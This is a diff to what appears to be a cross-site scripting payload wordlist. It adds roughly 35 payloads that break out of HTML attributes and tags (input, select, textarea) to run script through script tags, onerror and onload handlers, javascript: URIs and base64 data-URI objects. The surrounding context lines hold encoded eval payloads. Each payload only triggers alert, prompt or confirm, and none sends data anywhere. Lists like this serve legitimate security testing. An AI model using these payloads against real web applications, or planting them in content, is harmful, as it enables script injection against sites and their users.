@@ -100,12 +100,38 @@
 "><script>eval(decodeURIComponent('%61%6c%65%72%74%28%31%29%3b'))</script>
 "><script>eval(decodeURIComponent('YWxlcnQoMSk%3d'))</script>
 "><script>eval(decodeURIComponent('YWxlcnQoMSk%253d'))</script>
-
-
-
-
-
-
-
-
-
+"><script>alert(1)</script>
+<script>prompt(1)</script>
+<script>confirm(1)</script>
+"><img src=x onerror=alert(1)>
+"><svg onload=alert(1)>
+"><object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
+"><iframe src="javascript:alert(1)">
+"><a href="javascript:alert(1)">Click here</a>
+"><img src="javascript:alert(1)">
+" onclick=alert(1)>Click me
+"><img src=x onmouseover=alert(1)>
+"><input type="text" value=""><script>alert(1)</script>
+"><input type="text" value=""><img src=x onerror=alert(1)>
+"><input type="text" value=""><svg onload=alert(1)>
+"><input type="text" value=""><object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
+"><input type="text" value=""><iframe src="javascript:alert(1)">
+"><input type="text" value=""><a href="javascript:alert(1)">Click here</a>
+"><input type="text" value=""><img src="javascript:alert(1)">
+" onfocus=alert(1) autofocus><input type="text">
+"><select><option>"><script>alert(1)</script>
+"><select><option><img src=x onerror=alert(1)>
+"><select><option><svg onload=alert(1)>
+"><select><option><object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
+"><select><option><iframe src="javascript:alert(1)">
+"><select><option><a href="javascript:alert(1)">Click here</a>
+"><select><option><img src="javascript:alert(1)">
+"><textarea>"><script>alert(1)</script>
+"><textarea><img src=x onerror=alert(1)>
+"><textarea><svg onload=alert(1)>
+"><textarea><object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
+"><textarea><iframe src="javascript:alert(1)">
+"><textarea><a href="javascript:alert(1)">Click here</a>
+"><textarea><img src="javascript:alert(1)">
+"><body onload=alert(1)>
+"><body onpageshow=alert(1)>
